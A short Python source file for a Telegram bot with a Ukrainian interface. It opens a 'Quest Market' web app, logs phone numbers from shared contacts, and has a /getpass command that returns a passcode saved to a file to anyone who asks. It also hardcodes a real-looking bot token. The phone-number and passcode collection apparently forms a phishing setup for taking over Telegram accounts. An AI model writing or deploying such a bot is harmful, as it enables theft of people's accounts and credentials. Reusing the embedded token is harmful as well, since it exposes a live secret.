import telebot
from telebot import types

TOKEN = "8506299686:AAGY84tLNYv6Q3IgoR5ZXtB5jYnNMl-WWiA"
WEBAPP_URL = "https://fairusss.github.io/tgbot/"

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(
            text="Відкрити WebApp",
            web_app=types.WebAppInfo(url=WEBAPP_URL)
        )
    )
    bot.send_message(
        message.chat.id,
        "Привіт! Натисни, щоб відкрити Quest Market:",
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def handle_webapp_data(message):
    data = message.contact.phone_number
    print("Отримано номер:", data)
    bot.send_message(message.chat.id, f"Отримано номер: {data}")

@bot.message_handler(commands=['getpass'])
def get_pass(message):
    try:
        with open("temp_passcode.txt", "r") as f:
            saved = f.read()
        bot.send_message(message.chat.id, f"📄 Saved passcode: {saved}")
    except FileNotFoundError:
        bot.send_message(message.chat.id, "❌ No passcode saved yet.")
